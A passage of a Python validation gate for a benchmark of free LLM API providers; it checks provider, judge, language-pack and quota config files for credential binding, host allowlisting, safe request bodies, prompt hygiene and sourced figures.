                                "key is the paid credential in this house and is never a provider's; "
                                "a provider's key never scores the jury." % (key_env, prev_role, role)))
    maps["key_role"].setdefault(key_env, role)
    prev_host_role = maps["host_role"].get(registrable(host))
    if prev_host_role and prev_host_role != role:
        problems.append((where, "host %s is already bound as a %s and this entry uses it as a %s: one "
                                "host, one role, or the two files spend the same credential twice"
                         % (host, prev_host_role, role)))
    maps["host_role"].setdefault(registrable(host), role)


def check_extra_body(where, eb, problems):
    """extra_body is merged into the request body last, so it can replace anything the runner set.
    Only the documented reasoning switches may travel in it, each in its exact shape (ALLOWED_EXTRA_BODY);
    every other key is refused, whatever its value, because the list of keys that can hurt is open-ended
    and the list of switches the runner documents is four lines long."""
    if eb is None:
        return
    if not isinstance(eb, dict):
        problems.append((where, "extra_body must be a JSON object"))
        return
    for k, v in eb.items():
        if k in FORBIDDEN_EXTRA_BODY:
            problems.append((where, "extra_body sets %r. It is merged into the request AFTER model, "
                                    "messages and max_tokens, so this key silently replaces what the "
                                    "runner meant to send - a different model or prompt billed to "
                                    "every runner's key, or n completions per call. A switch that "
                                    "turns reasoning down is allowed; a rewrite of the request is "
                                    "not." % k))
            continue
        if k not in ALLOWED_EXTRA_BODY:
            problems.append((where, "extra_body.%s: %s (%s). A budget, an output cap under another name, "
                                    "a stop sequence or a generation parameter is not a switch: the first "
                                    "spends quota outside max_tokens, the second and third break one "
                                    "provider's answers, and the last belongs in the language pack where "
                                    "it applies to every model alike."
                             % (str(k)[:40], EXTRA_BODY_REFUSED,
                                "; ".join("%s: %s" % kv for kv in ALLOWED_EXTRA_BODY.items()))))
            continue
        shape = ALLOWED_EXTRA_BODY[k]
        ok = ((k == "reasoning_effort" and v in REASONING_EFFORTS)
              or (k == "enable_thinking" and isinstance(v, bool))
              or (k == "chat_template_kwargs" and isinstance(v, dict) and set(v) == {"enable_thinking"}
                  and isinstance(v["enable_thinking"], bool))
              or (k == "thinking" and isinstance(v, dict) and set(v) == {"type"} and v["type"] in THINKING_TYPES))
        if not ok:
            problems.append((where, "extra_body.%s must be %s, got %s. The switch is allowed in exactly the "
                                    "shape the runner documents; anything riding along inside it is not a "
                                    "switch." % (k, shape, json.dumps(v)[:80])))


# ---------------------------------------------------------------- providers.json

def check_providers(path, problems, maps=None):
    """Returns the providers list, for the checks that cross-reference it. Empty if the file failed."""
    data = load_json(path, problems)
    if data is None:
        return []
    providers = data.get("providers", [])
    if not providers or not isinstance(providers, list):
        problems.append((path.name, "no providers defined"))
        return []

    maps = maps if maps is not None else new_bindings()
    names = set()
    for p in providers:
        if not isinstance(p, dict):
            problems.append((path.name, "every provider must be a JSON object"))
            continue
        name, url, key_env = p.get("name", ""), p.get("url", ""), p.get("key_env", "")
        auth = p.get("auth", "key")
        where = "%s: provider %r" % (path.name, name or "<unnamed>")

        if auth not in ("key", "none"):
            problems.append((where, "auth must be \"key\" or \"none\", got %r" % auth))
            continue
        if not name or not url or not isinstance(name, str) or not isinstance(url, str):
            problems.append((where, "needs name and url"))
            continue
        # An endpoint that needs no key is the most valuable row in this repo and the formula pays it a
        # bonus, so the claim has to be declared out loud rather than inferred from a missing field: a
        # dropped key_env would otherwise silently promote a provider AND stop sending its credential.
        if auth == "none":
            if key_env:
                problems.append((where, "auth is \"none\" but key_env is set. One or the other: a keyless "
                                        "entry must not name a credential, or a reader cannot tell which "
                                        "of the two the ranking believed."))
                continue
        elif not key_env:
            problems.append((where, "needs key_env, or auth: \"none\" if the endpoint genuinely takes no "
                                    "credential. Omitting both would rank it as keyless, which pays a "
                                    "%s bonus - that claim is declared, never inferred." % "1.25x"))
            continue
        if not NAME_OK.match(name):
            problems.append((where, "name must be 3 to 32 lowercase letters, digits, - or _: it is a map "
                                    "key in limits.json and privacy.json and a cell in generated tables"))
        # Case-insensitively: a second "Groq" beside "groq" is the same account probed twice a day by
        # every runner, and two rows in every table for one endpoint.
        if name.lower() in names:
            problems.append((where, "duplicate provider name (names are compared case-insensitively: "
                                    "the same endpoint twice doubles every runner's load on one account)"))
        names.add(name.lower())

        # --- the endpoint itself
        parsed = urlparse(url)
        if parsed.scheme != "https":
            problems.append((where, "url must be https, got %r" % parsed.scheme))
        if parsed.username or parsed.password:
            problems.append((where, "url carries credentials in it"))
        host = host_of(url)
        if not host:
            problems.append((where, "url has no host"))
            continue
        if FORBIDDEN_HOST.match(host):
            problems.append((where, "url points at %r, which is not a public provider host" % host))
        if host not in ALLOWED_HOSTS:
            problems.append((where, "host %r is not in ALLOWED_HOSTS. This benchmark sends real API keys "
                                    "in Authorization headers, so every destination it can reach is "
                                    "declared in code, not in data - and a keyless entry is no exception, "
                                    "because the next edit to it can add a key_env. If this provider is "
                                    "genuine, add the host to ALLOWED_HOSTS in this gate in the same pull "
                                    "request." % host))
        if host in JUDGE_ONLY_HOSTS:
            problems.append((where, "host %r is a judge's endpoint, not a benchmarked provider. It is in "
                                    "ALLOWED_HOSTS for judges.json only; a provider entry there would "
                                    "spend the jury's paid plan on the battery and the daily radar." % host))
        if written_port(url) is not None:
            problems.append((where, "url writes a port (%s). The runner speaks to the default port only; "
                                    "another listener is another party, and http_safe refuses the same "
                                    "destination when a redirect points at it. An allowed host with a "
                                    "port on it is not the allowed host." % (parsed.netloc.rsplit("@", 1)[-1])))
        if parsed.query or parsed.fragment:
            problems.append((where, "url carries a query string or fragment; endpoints here are plain paths"))
        if not parsed.path.endswith(ENDPOINT_PATH) or "//" in parsed.path or ".." in parsed.path:
            problems.append((where, "url path must end with %s: that is the only shape the runners speak. "
                                    "A different path on an allowed host still carries the key, and bills "
                                    "every runner for a call the table never shows." % ENDPOINT_PATH))

        # Placeholders get substituted from the environment at request time. Only one is allowed, and
        # only on its own host.
        for ph in re.findall(r"\{([A-Za-z_][A-Za-z0-9_]*)\}", url):
            if ph not in ALLOWED_URL_PLACEHOLDERS:
                problems.append((where, "url interpolates {%s}. Only %s may appear in a URL: any other "
                                        "environment variable placed in a path would be sent to the host "
                                        "as plain text, which is how a second key leaks."
                                 % (ph, ", ".join(sorted(ALLOWED_URL_PLACEHOLDERS)))))
            elif host not in PLACEHOLDER_HOSTS.get(ph, set()):
                problems.append((where, "url interpolates {%s} on host %r. That placeholder belongs to %s "
                                        "only; on any other host the runner would send the value to a "
                                        "third party in the request path."
                                 % (ph, host, ", ".join(sorted(PLACEHOLDER_HOSTS.get(ph, set()))))))

        if key_env:
            # Every check in this block binds a credential to a host. A keyless endpoint has no
            # credential to bind - but the host allowlist above and the model checks below still
            # apply to it, so this narrows rather than exempts.
            if not isinstance(key_env, str) or not KEY_ENV_OK.match(key_env):
                problems.append((where, "key_env %r is not a plain uppercase environment variable name" % key_env))
            else:
                # --- THE RULE: one key variable, one host. Forever. Shared with judges.json.
                bind_key(where, key_env, host, problems, maps, "provider")

                # --- the key variable must belong to this provider, by name or by a declared alias:
                # <NAME>_API_KEY or <NAME>_API_TOKEN, the name at least four characters and not a word
                # every key variable contains. "api" owned GROQ_API_KEY under the substring rule.
                stem = re.sub(r"[^A-Z0-9]", "", name.upper())
                shape = KEY_ENV_SHAPE.match(key_env)
                env_stem = re.sub(r"[^A-Z0-9]", "", shape.group("stem")) if shape else ""
                aliased = key_env in KNOWN_KEY_ALIASES.get(name, set())
                if not aliased and (len(stem) < MIN_NAME_STEM or stem.lower() in GENERIC_NAMES or env_stem != stem):
                    problems.append((where, "key_env %s does not name this provider and is not a declared "
                                            "alias. A provider called %r must read its own variable, "
                                            "%s_API_KEY or %s_API_TOKEN: a name of at least %d characters, "
                                            "not one of %s, equal to the variable's prefix. Under a looser "
                                            "rule a provider called 'api' claimed another provider's key on "
                                            "that provider's host and became a second row on the same "
                                            "account. If this provider genuinely brands its key "
                                            "differently, add the pair to KNOWN_KEY_ALIASES in this gate, "
                                            "in the same pull request, so a reviewer sees it."
                                     % (key_env, name, stem or "NAME", stem or "NAME", MIN_NAME_STEM,
                                        ", ".join(sorted(GENERIC_NAMES)))))

        # --- signup link should be the provider's own site, so nobody is sent to a lookalike
        signup = p.get("signup", "")
        if signup:
            s_host = host_of(signup)
            allowed_signup = KNOWN_SIGNUP_HOSTS.get(name, set()) | {registrable(host)}
            if urlparse(signup).scheme != "https":
                problems.append((where, "signup link must be https"))
            elif registrable(s_host) not in allowed_signup:
                problems.append((where, "signup points at %s, which is neither the API domain (%s) nor a "
                                        "declared sign-up host for %r. A sign-up link on an undeclared "
                                        "domain is how people get phished; add it to KNOWN_SIGNUP_HOSTS "
                                        "in this gate if it is genuine."
                                 % (s_host, registrable(host), name)))

        # --- the models: what the runner will call, how many times, and with what budget
        models = p.get("models")
        if not isinstance(models, list) or not models:
            problems.append((where, "needs a non-empty models list: every runner indexes into it, and an "
                                    "entry with none crashes the battery, the radar and the throughput "
                                    "test for everyone"))
            models = []
        if len(models) > MAX_MODELS_PER_PROVIDER:
            problems.append((where, "%d models; at most %d per provider. Every model is probed daily and "
                                    "benchmarked with every probe several times, all on each runner's "
                                    "free quota." % (len(models), MAX_MODELS_PER_PROVIDER)))
        seen_ids = set()
        for m in models:
            if not isinstance(m, dict) or not m.get("id"):
                problems.append((where, "every model needs an id"))
                continue
            mid = m["id"]
            m_where = "%s model %r" % (where, str(mid)[:50])
            if not isinstance(mid, str) or not MODEL_ID_OK.match(mid):
                problems.append((m_where, "model id has an unexpected shape. Ids are rendered inside "
                                          "backticks in generated markdown tables, so a backtick, a pipe, "
                                          "a bracket or whitespace in one becomes a live link on a public "
                                          "page. Allowed: letters, digits and . _ / : ~ + -"))
            elif mid.lower() in seen_ids:
                problems.append((m_where, "duplicate model id under this provider"))
            if isinstance(mid, str):
                seen_ids.add(mid.lower())
            mt = m.get("max_tokens")
            if mt is not None and (not is_int(mt) or not MAX_TOKENS[0] <= mt <= MAX_TOKENS[1]):
                problems.append((m_where, "max_tokens must be an integer between %d and %d, got %r. It is "
                                          "the budget of every call on every runner's quota."
                                 % (MAX_TOKENS[0], MAX_TOKENS[1], mt)))
            check_extra_body(m_where, m.get("extra_body"), problems)

        # --- pacing: how hard every runner hits this endpoint, and how long it waits for it
        ps = p.get("pause_seconds")
        if ps is not None and (not is_num(ps) or not PAUSE_SECONDS[0] <= ps <= PAUSE_SECONDS[1]):
            problems.append((where, "pause_seconds must be a number between %s and %s, got %r. Zero hammers a "
                                    "free tier from every runner at once; an hour parks the runner."
                             % (PAUSE_SECONDS[0], PAUSE_SECONDS[1], ps)))
        ts = p.get("timeout_seconds")
        if ts is not None and (not is_num(ts) or not TIMEOUT_SECONDS[0] <= ts <= TIMEOUT_SECONDS[1]):
            problems.append((where, "timeout_seconds must be a number between %s and %s, got %r. A timeout "
                                    "of 0.001 or -1 makes every radar probe record this endpoint as down, "
                                    "and fourteen of those bury it with a public headstone."
                             % (TIMEOUT_SECONDS[0], TIMEOUT_SECONDS[1], ts)))
        up = p.get("unsupported_params")
        if up is not None:
            if not isinstance(up, list) or any(not isinstance(x, str) or x not in GENERATION for x in up):
                problems.append((where, "unsupported_params must list generation parameters only (%s)"
                                 % ", ".join(sorted(GENERATION))))
            elif set(up) >= set(GENERATION):
                problems.append((where, "unsupported_params lists every generation parameter (%s). The runner "
                                        "would send this provider none of them, so its runs would be made under "
                                        "different settings from every other provider's and could not be "
                                        "compared with them; a provider that genuinely rejects all of them "
                                        "cannot be benchmarked here." % ", ".join(sorted(GENERATION))))
        for f in ("unsupported_measured_on", "auth_measured_on"):
            if p.get(f) is not None and not is_iso_date(p[f]):
                problems.append((where, "%s must be a date, YYYY-MM-DD" % f))
    return providers


# ---------------------------------------------------------------- languages/*.json

def check_language(path, problems, providers=None):
    """`providers` is the providers.json list: every name in it is a vendor a prompt may not mention."""
    d = load_json(path, problems)
    where = "bench/languages/%s" % path.name
    if d is None:
        return
    brands = brand_re(providers)
    for field in ("language", "code", "probes", "jury"):
        if field not in d:
            problems.append((where, "missing required field %r" % field))
    code = d.get("code")
    if code and (path.stem != code or not re.fullmatch(r"[a-z]{2,8}", code)):
        problems.append((where, "code %r must match the filename and be two to eight lowercase letters, "
                                "the shape benchmark.py --language accepts" % code))

    # The alphabet the checkers count. A character in both sets would fail every answer.
    dia, wrong = d.get("diacritics", ""), d.get("wrong_diacritics", "")
    if not isinstance(dia, str) or not isinstance(wrong, str):
        problems.append((where, "diacritics and wrong_diacritics must be strings"))
        dia, wrong = "", ""
    elif set(dia) & set(wrong):
        problems.append((where, "a character appears in both diacritics and wrong_diacritics, which would "
                                "fail every answer that uses it"))

    # Generation parameters go into EVERY request to EVERY provider before the provider's own
    # extra_body, so this block is the single most powerful edit in the repo: one line here can point
    # the whole battery at a paid model with a huge budget. Only the declared parameters, in range.
    gen = d.get("generation")
    if gen is not None:
        if not isinstance(gen, dict):
            problems.append((where, "generation must be an object"))
        else:
            for k, v in gen.items():
                if k not in GENERATION:
                    problems.append((where, "generation.%s is not a generation parameter. Only %s may be "
                                            "sent, because this block goes into every request to every "
                                            "provider - a model, a budget or an n here rewrites the "
                                            "battery for everyone." % (k, ", ".join(sorted(GENERATION)))))
                    continue
                lo, hi = GENERATION[k]
                if k == "seed" and not is_int(v):
                    problems.append((where, "generation.seed must be an integer"))
                elif not is_num(v) or not lo <= v <= hi:
                    problems.append((where, "generation.%s must be a number between %s and %s, got %r"
                                     % (k, lo, hi, v)))

    probes = d.get("probes")
    if probes is not None and not isinstance(probes, dict):
        problems.append((where, "probes must be an object"))
        probes = {}
    for name, spec in (probes or {}).items():
        p_where = "%s probe %s" % (where, name)
        if not isinstance(spec, dict) or "prompt" not in spec or "kind" not in spec:
            problems.append((p_where, "needs a prompt and a kind"))
            continue
        prompt, kind = spec["prompt"], spec["kind"]
        if not is_text(prompt):
            problems.append((p_where, "prompt must be a non-empty string"))
            continue
        if kind not in PROBE_KINDS:
            problems.append((p_where, "kind %r is not one benchmark.check() knows (%s)"
                             % (kind, ", ".join(sorted(PROBE_KINDS)))))
            continue
        # The prompt is sent to every third party and its echo is published in results/. Anything that
        # looks like an address, a key, a link or a vendor does not belong in it.
        if re.search(r"https?://|www\.", prompt, re.I):
            problems.append((p_where, "prompt contains a URL. Probe prompts are sent to every provider "
                                      "and echoed into published results; keep them free of links."))
        elif BARE_DOMAIN.search(prompt):
            problems.append((p_where, "prompt contains a bare domain (%r). A domain without a scheme is "
                                      "still a link once it is echoed into a published results file."
                             % BARE_DOMAIN.search(prompt).group(0)))
        if brands.search(prompt):
            problems.append((p_where, "prompt names a vendor or a model family (%r). A probe that names "
                                      "one of the parties it measures is a bias, not a measurement."
                             % brands.search(prompt).group(0)))
        if re.search(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}", prompt):
            problems.append((p_where, "prompt contains an email address"))
        if re.search(r"\b(sk-|gsk_|nvapi-|AIza)[A-Za-z0-9_\-]{8,}", prompt):
            problems.append((p_where, "prompt contains something shaped like an API key"))
        if len(prompt) > MAX_PROMPT_CHARS:
            problems.append((p_where, "prompt is over %d characters; probes are short by design" % MAX_PROMPT_CHARS))
        mt = spec.get("max_tokens")
        if mt is not None and (not is_int(mt) or not MAX_TOKENS[0] <= mt <= MAX_TOKENS[1]):
            problems.append((p_where, "max_tokens must be an integer between %d and %d" % MAX_TOKENS))

        # Thresholds: a probe that any answer passes measures nothing, and a window that is inverted
        # fails every answer. Both are one-character edits.
        if kind == "arithmetic":
            en = spec.get("expect_numbers")
            if not isinstance(en, list) or not en or not all(is_int(x) for x in en):
                problems.append((p_where, "arithmetic probes need expect_numbers: a non-empty list of integers"))
        if kind == "json_extraction":
            ex = spec.get("expect")
            if not isinstance(ex, dict) or not ex:
                problems.append((p_where, "json_extraction probes need a non-empty expect object"))
            sk = spec.get("string_keys", [])
            if not isinstance(sk, list) or (isinstance(ex, dict) and any(k not in ex for k in sk)):
                problems.append((p_where, "string_keys must list keys of expect"))
        if kind in ("diacritics_rewrite", "constrained_rewrite"):
            mc = spec.get("must_contain")
            if not isinstance(mc, list) or not mc or not all(is_text(x) for x in mc):
                problems.append((p_where, "%s probes need must_contain: a non-empty list of words. Without "
                                          "it, any string of the right length passes." % kind))
            mn = spec.get("must_not_contain", [])
            if not isinstance(mn, list) or not all(is_text(x) for x in mn):
                problems.append((p_where, "must_not_contain must be a list of strings"))
            lo, hi = spec.get("min_chars", 0), spec.get("max_chars", 10 ** 6)
            if not is_int(lo) or not is_int(hi) or not 0 <= lo < hi:
                problems.append((p_where, "min_chars must be below max_chars, both non-negative integers"))
        if kind == "paragraph":
            lo, hi = spec.get("min_words", 0), spec.get("max_words", 10 ** 6)
            if not is_int(lo) or not is_int(hi) or not 1 <= lo < hi:
                problems.append((p_where, "min_words must be at least 1 and below max_words, both integers"))
        if kind in ("diacritics_rewrite", "paragraph"):
            md = spec.get("min_diacritics", 0)
            if kind == "diacritics_rewrite" and not dia:
                problems.append((p_where, "a diacritics_rewrite probe in a pack with no diacritics alphabet "
                                          "can never be scored"))
            elif dia and (not is_int(md) or md < 1):
                problems.append((p_where, "min_diacritics must be an integer of at least 1 where the pack "
                                          "has a diacritics alphabet: at 0 the probe cannot fail"))
            elif not dia and (not is_int(md) or md != 0):
                problems.append((p_where, "min_diacritics must be 0 in a pack with no diacritics alphabet: "
                                          "any other value cannot be satisfied"))

    lenses = d.get("jury")
    if lenses is not None and not isinstance(lenses, dict):
        problems.append((where, "jury must be an object of lens name -> question"))
        lenses = {}
    if lenses and "sounds_human" not in lenses:
        problems.append((where, "jury must keep the lens name 'sounds_human': rank.py looks it up by "
                                "name to build the agent ranking"))
    for lens, q in (lenses or {}).items():
        if not is_text(q) or len(q) > MAX_PROMPT_CHARS or re.search(r"https?://|www\.", q, re.I):
            problems.append((where, "jury lens %r must be a short question with no link in it" % lens))


# ---------------------------------------------------------------- judges.json

def _model_ids_in(obj):
    """Every model id an archived run names: the values of `model` keys at any depth of raw.json."""
    out = set()
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k == "model" and isinstance(v, str):
                out.add(v)
            out |= _model_ids_in(v)
    elif isinstance(obj, list):
        for v in obj:
            out |= _model_ids_in(v)
    return out


def family_words(family):
    """The words of a judge's family that name a model line: three letters or more, so "z.ai GLM" is
    {"glm"} and "Anthropic Claude" is {"anthropic", "claude"}. A model id is split the same way."""
    if not isinstance(family, str):
        return set()
    return {w for w in re.split(r"[^a-z0-9]+", family.lower()) if len(w) >= 3}


def check_judges(path, problems, maps=None, providers=None):
    """A judge receives an API key too, so it gets the same treatment as a provider.

    Plus two rules of its own. At least one judge must be reachable by API: a jury made only of judges
    that run through private tooling cannot be reproduced by anyone, which would make half of every
    quality score an assertion rather than a measurement. And no judge may come from a family that is
    being judged - judges.json's own first rule - enforced by the family's words appearing in a judged
    model id: a model scoring its own family is a conflict of interest that no prompt wording fixes, and
    the file used to check only that the judges differed from EACH OTHER. Which models count as judged:
    when the file declares `scope.runs`, the models in results/<run>/raw.json of exactly those runs (a
    jury that scored an archived run is not scoring what providers.json lists today); otherwise every
    model in `providers`, the providers.json list.
    """
    if not path.exists():
        return
    d = load_json(path, problems)
    if d is None:
        return
    judges = d.get("judges", [])
    if not judges or not isinstance(judges, list):
        problems.append((path.name, "no judges defined"))
        return
    scoped = None                       # {run: model ids} when the file names the runs this jury scored
    scope = d.get("scope")
    if scope is not None:
        runs = scope.get("runs") if isinstance(scope, dict) else None
        if (not isinstance(runs, list) or not runs
                or not all(isinstance(r, str) and re.match(r"^\d{4}-\d{2}-\d{2}$", r) for r in runs)
                or not is_text(scope.get("why") if isinstance(scope, dict) else None)):
            problems.append((path.name, "scope must be an object with `runs`, a non-empty list of run dates "
                                        "(YYYY-MM-DD) that exist under results/, and `why` in text"))
        else:
            scoped = {}
            for r in runs:
                raw = path.parent.parent / "results" / r / "raw.json"
                ids = _model_ids_in(load_json(raw, problems)) if raw.exists() else None
                if not ids:
                    problems.append((path.name, "scope names run %r, and results/%s/raw.json is not there or "
                                                "names no model: a jury scoped to a run nobody can open is "
                                                "scoped to nothing" % (r, r)))
                else:
                    scoped[r] = ids
    maps = maps if maps is not None else new_bindings()
    families, api_judges, names = set(), 0, set()
    for j in judges:
        if not isinstance(j, dict):
            problems.append((path.name, "every judge must be a JSON object"))
            continue
        name = j.get("name", "<unnamed>")
        where = "%s: judge %r" % (path.name, name)
        if not isinstance(name, str) or not NAME_OK.match(name):
            problems.append((where, "name must be 3 to 32 lowercase letters, digits, - or _"))
        elif name.lower() in names:
            problems.append((where, "duplicate judge name"))
        if isinstance(name, str):
            names.add(name.lower())
        via = j.get("via")
        # judges.json's own header documents two values, api and manual. The gate used to admit a third,
        # "agent", that the file never described; an honesty field with an undocumented value is not one.
        if via not in ("api", "manual"):
            problems.append((where, "via must be 'api' or 'manual', got %r: those are the two ways judges.json "
                                    "documents, and via is an honesty field" % (via,)))
        if via == "api":
            api_judges += 1
            url = j.get("url", "")
            host = host_of(url) if isinstance(url, str) else ""
            if not isinstance(url, str) or urlparse(url).scheme != "https":
                problems.append((where, "url must be https"))
            if host not in ALLOWED_HOSTS:
                problems.append((where, "host %r is not in ALLOWED_HOSTS. A judge gets an API key in an "
                                        "Authorization header just like a provider does." % host))
            if isinstance(url, str) and written_port(url) is not None:
                problems.append((where, "url writes a port. The runner speaks to the default port only; "
                                        "another listener is another party."))
            if not j.get("key_env"):
                problems.append((where, "an api judge needs key_env"))
            elif not isinstance(j["key_env"], str) or not KEY_ENV_OK.match(j["key_env"]):
                problems.append((where, "key_env %r is not a plain uppercase environment variable name" % j["key_env"]))
            elif host:
                # Same map as the providers. A judge's key is a credential like any other, and the
                # paid one in this house is a judge's.
                bind_key(where, j["key_env"], host, problems, maps, "judge")
            model = j.get("model")
            if not isinstance(model, str) or not MODEL_ID_OK.match(model):
                problems.append((where, "an api judge needs a model id of the usual shape"))
            mt = j.get("max_tokens")
            if mt is not None and (not is_int(mt) or not MAX_TOKENS[0] <= mt <= MAX_TOKENS[1]):
                problems.append((where, "max_tokens must be an integer between %d and %d" % MAX_TOKENS))
            ps = j.get("pause_seconds")
            if ps is not None and (not is_num(ps) or not PAUSE_SECONDS[0] <= ps <= PAUSE_SECONDS[1]):
                problems.append((where, "pause_seconds must be a number between %s and %s" % PAUSE_SECONDS))
            check_extra_body(where, j.get("extra_body"), problems)
        elif via == "manual":
            # A judge nobody outside can call is a limitation, and the file has to say so in its own
            # words, next to the judge, where METHOD.md and a reader will find it.
            note = j.get("note")
            if not is_text(note) or not re.search(r"reproduc", note, re.I):
                problems.append((where, "a %r judge needs a note saying, in so many words, that a stranger "
                                        "cannot reproduce its scores. Half of every quality score comes "
                                        "from the jury; a judge reached through private tooling is a "
                                        "declared limitation, not a hidden one." % via))
        if not j.get("family"):
            problems.append((where, "every judge must declare its model family, so a reader can see "
                                    "whether it is scoring a relative"))
        elif scoped is not None or providers is not None:
            words = family_words(j["family"])
            if scoped is not None:
                pool, source = {"results/%s" % r: sorted(ms) for r, ms in scoped.items()}, "the runs the jury scored hold"
            else:
                pool, source = models_of(providers), "providers.json benchmarks"
            relatives = sorted((p, m) for p, ms in pool.items() for m in ms
                               if isinstance(m, str) and words & set(re.split(r"[^a-z0-9]+", m.lower())))
            if relatives:
                problems.append((where, "is from the %r family, and %s %s. judges.json's "
                                        "first rule is that a judge comes from a different family than the "
                                        "models being judged: a model scoring its own family is a conflict of "
                                        "interest that no prompt wording fixes. Replace the judge, or scope the "
                                        "jury to the runs it scored and keep every relative out of them."
                                 % (j["family"], source, "; ".join("%s's %s" % (p, m) for p, m in relatives[:4]))))
        families.add(j.get("family"))
    if api_judges == 0:
        problems.append((path.name, "no judge is reachable by API. At least one must be, or nobody "
                                    "outside this house can reproduce any part of the jury half."))
    if len(families) < 2:
        problems.append((path.name, "all judges are from the same family (%s). Agreement between judges "
                                    "of one family measures consistency, not correctness."
                         % ", ".join(sorted(str(f) for f in families))))


# ---------------------------------------------------------------- limits.json

def _walk_figures(where, obj, problems, trail=""):
    """Every quota figure, at any depth: a non-negative integer under its sanity ceiling, or null.
    "many", -5, [1] and 1e12 each passed the first version of this file. And every `confidence`
    below the top level is one of the labels the README legend prints."""
    if isinstance(obj, dict):
        for k, v in obj.items():
            here = trail + "." + str(k) if trail else str(k)
            if k in LIMIT_KEYS:
                if v is not None and (not is_int(v) or v < 0):
                    problems.append((where, "%s must be a non-negative integer or null, got %r" % (here, v)))
                elif v is not None and v > _ceiling(k):
                    problems.append((where, "%s is %s, past the sanity ceiling of %s for a free tier%s. If "
                                            "a provider genuinely publishes this, raise the ceiling in "
                                            "the gate in the same pull request."
                                     % (here, v, _ceiling(k),
                                        (" - the project's whole target of %s tokens a day, %s"
                                         % (daily_ceilings()["target"],
                                            "which no single provider may exceed" if k == "tpd" else
                                            "divided by the %d tokens a reply rank.py multiplies a request cap by"
                                            % daily_ceilings()["tokens_per_reply"])) if k in DAILY_KEYS else "")))
            elif k == "confidence" and trail and v not in CONFIDENCE + ("DERIVED",):
                problems.append((where, "%s must be MEASURED, DECLARED, DERIVED or UNKNOWN, got %r" % (here, v)))
            else:
                _walk_figures(where, v, problems, here)
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            _walk_figures(where, v, problems, "%s[%d]" % (trail, i))


def _check_grant(where, shelf, g, problems):
    """A one-time or a monthly grant is a different shelf from a daily quota, and the whole value of
    separating them is lost the moment one can be written without evidence. It also may not carry
    both a token figure and a money figure at once: those are two different claims and a reader
    adding them would double-count the same grant."""
    if not isinstance(g, dict):
        problems.append((where, "%s must be an object" % shelf))
        return
    gconf = g.get("confidence")
    if gconf not in CONFIDENCE:
        problems.append((where, "%s.confidence must be MEASURED, DECLARED or UNKNOWN" % shelf))
    if gconf in ("MEASURED", "DECLARED"):
        if not is_https_url(g.get("source")) or not is_iso_date(g.get("read_on")):
            problems.append((where, "a stated %s grant needs an https source and a read_on date. It is "
                                    "the number people sign up for; it does not get to be unsourced."
                             % shelf.replace("_", "-")))
        if gconf == "DECLARED" and not is_text(g.get("quote")):
            problems.append((where, "a DECLARED %s grant needs the provider's own sentence as `quote`. "
                                    "Our paraphrase of a giveaway is how a marketing figure becomes a "
                                    "fact." % shelf.replace("_", "-")))
    for f in ("tokens", "credits_usd"):
        ceiling = GRANT_CEILINGS[f] if GRANT_CEILINGS[f] is not None else daily_ceilings()["tokens"]
        if g.get(f) is not None and (not is_num(g[f]) or g[f] < 0):
            problems.append((where, "%s.%s must be a non-negative number or null" % (shelf, f)))
        elif g.get(f) is not None and g[f] > ceiling:
            problems.append((where, "%s.%s is %s, past the sanity ceiling of %s for a free grant%s. It is shown "
                                    "on the page even though it is never summed, and a shown figure is "
                                    "still a claim." % (shelf, f, g[f], ceiling,
                                                        " - the project's whole target, which no single "
                                                        "provider's figure may exceed" if f == "tokens" else "")))
        elif f == "tokens" and shelf == "one_time" and is_num(g.get("tokens")):
            # rank.py reads the one-time pot against the drawn rate, so it is a daily-shelf figure too.
            _daily_figure(where, "one_time.tokens", g["tokens"], gconf, is_text(g.get("measured_how")),
                          problems, unit="tokens")
    if g.get("tokens") and g.get("credits_usd"):
        problems.append((where, "%s states BOTH tokens and credits_usd. Pick the one the provider "
                                "actually grants: carrying both invites adding the same gift to the "
                                "total twice." % shelf))


def _evidence(level):
    """(declared evidence present, measured evidence present) for one dict."""
    return (is_https_url(level.get("source")) and is_iso_date(level.get("read_on")),
            is_iso_date(level.get("measured_on")) and is_text(level.get("measured_how")))


def _walk_page_text(where, obj, problems, trail=""):
    """Every free-text field bench/rank.py renders raw, at any depth, held to page_text_problem()."""
    if isinstance(obj, dict):
        for k, v in obj.items():
            here = trail + "." + str(k) if trail else str(k)
            if k in TEXT_FIELDS and isinstance(v, str):
                why = page_text_problem(v)
                if why:
                    problems.append((where, "%s %s. It is rendered raw onto a generated page, where a link, "
                                            "a tag, a bracket, a code span or a second line becomes "
                                            "structure a reader clicks or reads as ours; the sentence does "
                                            "not need it." % (here, why)))
            elif k in TEXT_LIST_FIELDS:
                if not isinstance(v, list) or not all(isinstance(q, str) for q in v):
                    problems.append((where, "%s must be a list of strings" % here))
                else:
                    for i, q in enumerate(v):
                        why = page_text_problem(q)
                        if why:
                            problems.append((where, "%s[%d] %s. It is rendered raw as a blockquote on a "
                                                    "generated page; the provider's sentence does not need "
                                                    "a link, a tag, a bracket or a second line." % (here, i, why)))
            elif k == "measured_concurrency" and isinstance(v, dict):
                for mid, note in v.items():
                    if mid != "measured_on" and isinstance(note, str) and page_text_problem(note):
                        problems.append((where, "%s.%s %s: rendered raw onto LIMITS.md" % (here, mid, page_text_problem(note))))
            else:
                _walk_page_text(where, v, problems, here)
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            _walk_page_text(where, v, problems, "%s[%d]" % (trail, i))


def _walk_sources(where, obj, problems, own, trail=""):
    """Every `source` at any depth must sit on one of the provider's own domains. A DECLARED figure
    sourced on a paste site put 9,999,999,999 tokens a day on the DECLARED shelf with 0 findings."""
    if isinstance(obj, dict):
        for k, v in obj.items():
            here = trail + "." + str(k) if trail else str(k)
            if k == "source" and is_https_url(v):
                if registrable(host_of(v)) not in own:
                    problems.append((where, "%s is on %s, which is not this provider's domain (%s). Evidence for "
                                            "a quota is the provider's own page; a page anywhere else is "
                                            "somebody's summary. If they genuinely publish on that domain, "
                                            "add it to KNOWN_TERMS_HOSTS in this gate, in the same pull "
                                            "request." % (here, host_of(v), ", ".join(sorted(own)))))
            else:
                _walk_sources(where, v, problems, own, here)
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            _walk_sources(where, v, problems, own, "%s[%d]" % (trail, i))


def _check_typed_blocks(where, p, problems):
    """The figures outside LIMIT_KEYS that rank.py can read into a daily number: typed and bounded."""
    d = p.get("derived")
    if d is not None:
        if not isinstance(d, dict):
            problems.append((where, "derived must be an object"))
        else:
